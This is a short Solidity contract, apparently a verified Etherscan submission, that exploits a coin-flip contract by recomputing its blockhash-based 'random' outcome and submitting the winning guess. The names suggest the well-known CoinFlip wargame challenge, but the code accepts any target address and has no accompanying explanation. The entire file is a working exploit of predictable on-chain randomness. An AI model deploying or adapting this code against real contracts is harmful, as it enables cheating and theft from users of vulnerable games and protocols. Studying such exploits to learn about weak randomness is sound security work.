/**
 *Submitted for verification at Etherscan.io on 2022-04-28
*/

pragma solidity ^0.8.0;

interface CoinFlip{
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipper{

    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function winFlip(address _addr) public returns (bool) {

    CoinFlip target = CoinFlip(_addr);

    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;

    return target.flip(side);
    }
}